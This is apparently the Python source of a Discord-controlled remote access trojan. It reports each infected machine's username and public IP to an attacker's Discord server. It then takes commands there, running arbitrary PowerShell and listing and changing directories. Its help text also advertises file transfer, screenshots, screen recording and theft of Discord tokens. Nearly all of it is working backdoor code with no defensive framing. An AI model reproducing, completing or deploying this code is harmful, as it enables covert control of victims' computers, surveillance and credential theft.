import os, websocket, asyncio, requests, json, subprocess
from dotenv import load_dotenv

load_dotenv()

SESSION_ID = os.urandom(8).hex()
TOKEN = os.getenv("TOKEN")
API_URL = "https://discord.com/api"
WS_URL = "wss://gateway.discord.gg"
GUILD_ID = os.getenv("GUILD_ID")
COMMANDS = [
    "!help - Help command",
    "!ping - Ping command",
    "!cd - Change directory",
    "!ls - List directory",
    "!download - Download file",
    "!upload - Upload file",
    "!shell - Execute shell command",
    "!run - Run an file",
    "!exit - Exit the session",
    "!screenshot - Take a screenshot",
    "!record <seconds> - Record the screen",
    "!tokens - Get all discord tokens"
]

async def on_message(command, channel_id, session):
    if command.lower() == "!help":
        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
            "embeds": [{
                "title": "Help",
                "description": "```{}```".format(
                    "\n".join(COMMANDS)
                ),
                "color": 0xfafafa
            }]
        })
    elif command.lower() == "!ping":
        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
            "content": "Session is alive"
        })
    elif "!cd" in command.lower():
        arg = command[4:]
        if arg:
            try:
                os.chdir(arg)
                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                    "embeds": [{
                        "title": "Changed directory",
                        "description": "```{}```".format(
                            os.getcwd()
                        ),
                        "color": 0xfafafa
                    }]
                })
            except:
                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                    "embeds": [{
                        "title": "Error",
                        "description": "```{}```".format(
                            "Invalid directory"
                        ),
                        "color": 0xfafafa
                    }]
                })
        else:
            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                "embeds": [{
                    "title": "Error",
                    "description": "```{}```".format(
                        "No argument specified"
                    ),
                    "color": 0xfafafa
                }]
            })
    elif command.lower() == "!ls":
        session.post(f"{API_URL}/channels/{channel_id}/messages", json={
            "embeds": [{
                "title": "Files",
                "description": "```{}```".format(
                    "\n".join(os.listdir())
                ),
                "color": 0xfafafa
            }]
        })
    elif "!shell" in command.lower():
        arg = command[7:]
        if arg:
            try:
                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                    "embeds": [{
                        "title": "Shell",
                        "description": "```{}```".format(
                            subprocess.Popen(["powershell", arg], stdout=subprocess.PIPE).communicate()[0].decode("utf-8")
                        ),
                        "color": 0xfafafa
                    }]
                })
            except:
                session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                    "embeds": [{
                        "title": "Error",
                        "description": "```{}```".format(
                            "Invalid command"
                        ),
                        "color": 0xfafafa
                    }]
                })
        else:
            session.post(f"{API_URL}/channels/{channel_id}/messages", json={
                "embeds": [{
                    "title": "Error",
                    "description": "```{}```".format(
                        "No argument specified"
                    ),
                    "color": 0xfafafa
                }]
            })

async def send_heartbeat(ws, interval):
    while True:
        ws.send(json.dumps({
            "op": 1,
            "d": None
        }))
        await asyncio.sleep(interval)

async def send_message(session, channel_id):
    session.post(f"{API_URL}/channels/{channel_id}/messages", json={
        "embeds": [{
            "title": "New session created",
            "description": "```{}```".format(
                "\n".join(COMMANDS)
            ),
            "color": 0xfafafa,
            "fields": [
                {
                    "name": "Session ID",
                    "value":  "```{}```".format(
                        SESSION_ID
                    ),
                    "inline": True
                },
                {
                    "name": "Username",
                    "value": "```{}```".format(
                        os.getenv("USERNAME")
                    ),
                    "inline": True
                },
                {
                    "name": "IP Address",
                    "value": "```{}```".format(
                        requests.get("https://api.ipify.org").text
                    ),
                    "inline": False
                }
            ]
        }]
    })

async def main():
    session = requests.Session()
    session.headers.update({
        "Authorization": f"Bot {TOKEN}"
    })
    channel_id = session.post(f"{API_URL}/guilds/{GUILD_ID}/channels", json={
        "name": SESSION_ID,
        "type": 0
    }).json()["id"]
    asyncio.create_task(
        send_message(session, channel_id)
    )
    ws = websocket.create_connection(f"{WS_URL}/?v=6&encoding=json")
    asyncio.create_task(
        send_heartbeat(ws, json.loads(ws.recv())["d"]["heartbeat_interval"] / 1000)
    )
    ws.send(json.dumps({
        "op": 2,
        "d": {
            "token": TOKEN,
            "intents": 3276792,
            "properties": {
                "$os": "linux",
                "$browser": "python",
                "$device": SESSION_ID,
            }
        }
    }))
    while True:
        data = json.loads(ws.recv())
        if data["t"] == "MESSAGE_CREATE":
            if data["d"]["channel_id"] == channel_id:
                asyncio.create_task(
                    on_message(data["d"]["content"], channel_id, session)
                )
        await asyncio.sleep(0.1)

asyncio.run(main())